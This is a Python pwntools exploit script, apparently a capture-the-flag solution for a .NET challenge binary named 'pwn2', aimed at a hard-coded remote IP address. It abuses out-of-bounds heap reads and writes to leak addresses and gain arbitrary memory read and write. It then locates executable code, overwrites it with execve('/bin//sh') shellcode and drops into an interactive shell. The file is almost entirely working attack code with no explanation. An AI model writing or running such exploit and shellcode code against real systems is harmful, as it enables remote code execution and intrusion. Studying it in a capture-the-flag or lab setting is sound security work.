from pwn import *
context.log_level = 'debug'
# p = gdb.debug(['bin/Release/netcoreapp3.0/pwn2'], gdbscript='''
# c
# ''')
# p = process(['bin/Release/netcoreapp3.0/pwn2'])
#p = remote('localhost', 1208)
#p = remote('34.198.170.179', 1208)
p=  remote('3.93.128.89',1208)
alloced = 0


def alloc(size):
    print '=== ALLOC %s ===' % size
    p.send(p8(1))
    p.send(p8(size))
    global alloced
    alloced += 1


def write(index, offset, data):
    print '=== WRITE %s[%s:%s] ===' % (index, hex(offset), len(data))
    p.send(p8(3))
    p.send(p8(index))
    p.send(p8(offset))
    p.send(p8(len(data)))
    p.send(data)


def read(index, offset, size):
    print '=== READ %s[%s:%s] ===' % (index, hex(offset), size)
    # if offset > 0xff or offset < 0
    #     raise Exception("Not allowed")
    p.send(p8(2))
    p.send(p8(index))
    p.send(p8(offset))
    p.send(p8(size))
    return p.recvn(size)

HELPER_INDEX = 1
HELPER_INDEX2 = 2


def reloc_read(addr, size):
    buf = ''
    for chunk in range(addr, addr + size, 250):
        print hex(chunk)
        write(HELPER_INDEX, 0x60, p64(chunk - 8))
        buf += read(HELPER_INDEX2, 0, min(250, addr + size - chunk))
    return buf

def reloc_write(addr, data):
    for chunk in range(addr, addr + len(data), 250):
        write(HELPER_INDEX, 0x60, p64(chunk - 8))
        write(HELPER_INDEX2, 0, data[chunk-addr:][:250])



# alloc(16)
# write(0, 0, 'A'*16)
# alloc(16)
# write(1, 0, 'B'*16)
# addr0 = u64(read(0, -0x20, 8)) + 8
# addr1 = u64(read(1, -0x20, 8)) + 8
# print 'Addr 0: 0x%x' % addr0
# print 'Addr 1: 0x%x' % addr1
# print hexdump(read(0, -0x100, 0x800), begin=addr0 - 0x100)

# print hexdump(reloc_read(addr1 + 8, 0, 16), begin=addr1 + 8)

p.recvrepeat(1)

alloc(16)
write(0, 0, 'A'*16)
alloc(16)
alloc(16)
write(1, 0, 'B'*16)
write(2, 0, 'C'*16)

# addr0 = u64(read(0, -0x20, 8)) + 8
# print 'Addr 0: 0x%x' % addr0
# print hexdump(read(0, -0x100, 0x800))
print hexdump(read(1, 0, 0xff))

leak = u64(read(HELPER_INDEX, 0x70, 8))
print 'leak: 0x%x' % leak

code = leak - 0x7e560 - 0x3020

leak2 = u64(read(HELPER_INDEX, 0x58, 8))

for i in range(40):
    print 'code: 0x%x' % code, " attempt %s" % i
    codes = reloc_read(code, 0x400)
    if p64(leak) in codes:
        break
    code += 0x400

#print hexdump(codes, begin=code)
#print disasm(codes)
print codes.encode('hex')

#p.interactive()
# inst = code + codes.index('\x85\f6')
#inst = code + codes.index(p64(leak2))
inst = code + codes.index(p64(leak))
print 'overwriting: 0x%x, at %x' % (inst, inst - code)

print hex(inst-leak)

shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
reloc_write(inst-2, shellcode)

#reloc_write(code - 0x10, shellcode.rjust(0x60, '\x90'))


# codes = reloc_read(code, 0x400)
# #print hexdump(codes, begin=code)
# #print disasm(codes)
# print codes.encode('hex')
#p.interactive()

alloc(8)


p.interactive()
